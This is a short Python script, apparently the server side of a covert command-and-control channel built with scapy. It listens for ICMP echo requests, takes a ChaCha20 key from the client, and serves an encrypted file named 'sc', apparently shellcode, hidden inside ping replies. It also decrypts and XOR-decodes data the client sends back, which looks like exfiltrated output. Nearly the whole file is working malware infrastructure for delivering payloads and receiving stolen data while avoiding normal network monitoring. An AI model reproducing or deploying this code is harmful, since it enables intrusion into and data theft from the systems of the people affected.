from scapy.all import *
from scapy.layers.inet import ICMP, IP
from Crypto.Cipher import ChaCha20

def split_user_data(data:bytes)->Tuple[int, bytes]:
    cmd = data[0]
    data_sz = int.from_bytes(data[1:5], 'little')
    return (cmd, data[5:5+data_sz])

key = b""
nonce = b""

def encryt(data:bytes)->bytes:
    return ChaCha20.new(key=key, nonce=nonce).encrypt(data)

def decryt(data:bytes)->bytes:
    return ChaCha20.new(key=key, nonce=nonce).decrypt(data)

def process_pkt(pkt):
    if ICMP in pkt and pkt[ICMP].type == 8:
        ip_pkt:IP = pkt[IP]
        icmp_pkt:ICMP = pkt[ICMP]
        
        user_data = bytes(icmp_pkt.payload)
        cmd, payload = split_user_data(user_data)
        print(f"cmd [{cmd}]")
        #print(f"payload [{payload}]")
        data = b""

        if cmd == 1:
            # print(len(payload))
            assert len(payload) == 44
            global key
            global nonce
            nonce = payload[:12]
            key = payload[12:]

            data = b"OK"
        elif cmd == 2 and decryt(payload).startswith(b"fetch cmd"):
            with open("sc", "rb") as fp:
                data = fp.read()
        elif cmd == 3:
            print(bytes([i^0x87 for i in decryt(payload)]))
            data = b"OK"

        res_pkt = IP(src=ip_pkt.dst, dst=ip_pkt.src)/ICMP(type=0, id=icmp_pkt.id, seq=icmp_pkt.seq)/encryt(data)
        send(res_pkt)
        
sniff(iface="ens33", store=False, prn=process_pkt) 
#print(encryt(pt).hex())